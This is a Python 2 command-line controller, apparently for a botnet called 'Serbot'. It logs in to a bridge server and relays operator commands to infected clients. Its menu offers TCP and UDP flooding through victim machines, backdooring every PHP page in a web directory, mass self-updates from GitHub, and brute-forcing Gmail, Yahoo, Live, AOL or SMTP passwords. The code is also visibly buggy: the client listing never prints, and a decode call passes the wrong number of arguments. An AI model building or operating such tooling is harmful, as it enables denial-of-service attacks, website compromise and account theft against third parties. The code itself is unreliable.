#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import json
import os
import subprocess
import sys
import threading
import time
from socket import *

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|
"""

_API_VERSION = 'v0.1'

commands = """

Primary:
--------
accept                  | Accept connections
list                    | List connections
clear                   | Clear the console
quit                    | Close all connections and quit
credits                 | Show Credits
help                    | Show this message

Client Interaction:
-------------------
interact <id>           | Interact with client
stop                    | Stop interacting with client
udpflood <ip>:<port>    | UDP flood threw client
tcpflood <ip>:<port>    | TCP flood threw client
serbackdoor <web dir>   | Infects all PHP Pages with Malicious Code that will run the Serbot Client (if killed) again
rmbackdoor <web dir>    | Removes the Malicious PHP Code

Wide Commands:
--------------
udpfloodall <ip>:<port> | Same as `udpflood` but for All clients
tcpfloodall <ip>:<port> | Same as `tcpflood` but for All clients
selfupdateall           | Update all Clients with the new version from Github

Bruteforce:
-----------
gmailbruteforce <email>:<keys>:<min>:<max>
yahoobruteforce <email>:<keys>:<min>:<max>
livebruteforce <email>:<keys>:<min>:<max>
aolbruteforce <email>:<keys>:<min>:<max>
	Example: gmailbruteforce someone@gmail.com:0123456789:6:8
custombruteforce <address>:<port>:<email>:<keys>:<min>:<max>
	Example: custombruteforce smtp.whatever.com:587:something@whatever.com:abcdefghi:4:6

\n"""
	
	
class control():

	def formatData(self, data):
		ipAddresses = []
		length = len(ipAddresses)
		i=0
		if length >= 1:
			print " _____________________"
			print "| # |       IP        |"
			print "|---------------------|"
			for client in data:
				IP = (client[u'ip'])
				print "| {lenn} | {ip} ".format(lenn=str(i), ip=IP)
				i=i+1
			
			print " --------------------- "
			return " "
		else:
			return " [-] No Clients Connected"
			
	def jsonDecode(self, string):
		try:
			parsed_json = json.loads(string)
			status = (parsed_json["status"])
			if status == "OK":
				command = (parsed_json["command"])
				if (command == "list"):
					client = (parsed_json["clients"])
					reply = control.formatData(self, client)
				else: 
					reply = (parsed_json["reply"])
			else:
				reply = (parsed_json["error"])
			return str(reply)
		except Exception as e:
			print " [!] {error}".format(error=str(e))

	def main(self):
		try:
			s=socket(AF_INET, SOCK_STREAM)
			s.connect((args.host,args.port))
		except Exception as e:
			sys.exit(e)

		login = {'password': args.password}
		login = json.dumps(login)
		s.send(login)

		while True:
			command = raw_input("$")
			try:
				if(command == "clear"):
					if sys.platform == 'win32':
						os.system("cls")
					else:
						os.system("clear")
				elif(command == "help"):
					print commands
				elif(command == "interact"): 
					client = raw_input(" [#] Client Number:")
					Cmd = {"command": command, "client":client}
					Cmd = json.dumps(Cmd)
					s.send(Cmd)
					reply = s.recv(20480)
					print reply

				else:
					Cmd = {'command': command}
					Cmd = json.dumps(Cmd)
					s.send(Cmd)
					reply = s.recv(20480)
					decode = control.jsonDecode(self, reply, "command")
					print decode

			except KeyboardInterrupt:
				try:
					s.send("quit")
					s.close()
					print " [!] Connection Closed"
					break
				except:
					pass
			except Exception as e:
				print e
				print " [!] Connection Closed"
				s.close()
				break

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-H", "--host", help="Host IP Address", required = True)
	parser.add_argument("-p", "--port", type=int, help="Connection Port Number", required = True)
	parser.add_argument("-P", "--password", type=str, help="Bridge Connection Password", required = True)
	parser.add_argument('-v', '--version',
						action='version',
						version=' [+] Version: 1.0')
	args = parser.parse_args()
	if sys.platform == 'win32': os.system("cls")
	else: os.system("clear")
	print intro
	control().main()
